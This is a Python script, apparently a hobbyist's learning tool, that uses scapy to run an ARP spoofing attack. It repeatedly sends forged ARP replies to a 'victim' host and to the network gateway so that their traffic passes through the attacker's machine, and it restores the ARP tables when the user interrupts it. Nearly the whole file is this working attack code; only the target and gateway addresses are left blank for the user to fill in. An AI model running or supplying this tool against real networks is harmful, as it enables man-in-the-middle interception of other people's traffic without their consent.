#!/usr/bin/env/python

import scapy.all as scapy
import time
import logging #To remove warning 

logging.getLogger("scapy.runtime").setLevel(logging.ERROR) #To remove warning 

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)#op=2 means its arp response not request that is 1
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = #Enter victom IP between " "
gateway_ip = #Enter gateway IP between " "

try:
    sent_packet_count = 0

    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packet_count = sent_packet_count + 2
        print(f"\r[+] Packets Sent {str(sent_packet_count)}", end="")
        time.sleep(2) #So that it did not get packet overload to vitom devices and router
except KeyboardInterrupt:
    print("\n[-] Detected Ctrl+C... Resetting ARP tables..... Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

